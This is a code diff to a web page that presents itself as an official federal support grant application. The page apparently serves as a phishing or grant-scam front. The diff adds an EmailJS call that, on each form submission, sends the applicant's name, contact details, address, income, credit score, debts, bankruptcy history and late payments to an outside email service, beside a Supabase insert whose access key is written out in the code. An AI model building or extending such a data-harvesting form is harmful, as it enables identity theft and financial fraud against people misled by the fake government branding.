@@ -6,6 +6,7 @@
 <title>Apply | Federal Support Grant — GVN Official Program</title>
 <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=DM+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script src="https://www.google.com/recaptcha/api.js" async defer></script>
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
@@ -690,6 +691,9 @@ body{font-family:'DM Sans',sans-serif;color:var(--dark);background:var(--off);ov
 
 <script>
 const { createClient } = supabase
+// ── EmailJS Init ──
+emailjs.init('HK4g3lzDR9qlFTZee')
+
 const db = createClient(
   'https://cxjtampdkollasplmzwi.supabase.co',
   'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImN4anRhbXBka29sbGFzcGxtendpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk3NjEwNDcsImV4cCI6MjA5NTMzNzA0N30.a56AwkIj0PvSXuPn1teDAjgDLp-Oi-ghieqVXVOibQQ'
@@ -870,7 +874,31 @@ document.getElementById('grantForm').addEventListener('submit', async (e) => {
     const {error} = await db.from('applications').insert([payload])
     if(error) throw new Error(error.message)
     document.getElementById('successRef').textContent = ref
-    recordSubmission() // Track this submission for rate limiting
+    recordSubmission()
+
+    // ── Send email notification ──
+    emailjs.send('service_crlwpr1', 'template_w0t5va9', {
+      reference_number : ref,
+      full_name        : [payload.first_name, payload.middle_name, payload.last_name].filter(Boolean).join(' '),
+      applicant_email  : payload.email,
+      phone            : payload.phone,
+      state            : payload.state,
+      address          : payload.address,
+      grant_category   : payload.grant_category,
+      amount           : payload.amount_requested.toLocaleString('en-US'),
+      applicant_type   : payload.applicant_type,
+      income           : payload.income_range,
+      credit_score     : payload.credit_score_range,
+      num_credit_cards : payload.num_credit_cards,
+      credit_card_debt : payload.credit_card_debt,
+      total_debt       : payload.total_debt,
+      monthly_debt     : payload.monthly_debt_payments,
+      bankruptcy       : payload.bankruptcy_history,
+      housing          : payload.housing_status,
+      late_payments    : payload.late_payments,
+      submitted_at     : new Date().toLocaleString('en-US')
+    }).catch(err => console.warn('Email notification failed:', err))
+
     document.getElementById('formCard').style.display = 'none'
     document.getElementById('successCard').style.display = 'block'
     window.scrollTo({top:0,behavior:'smooth'})
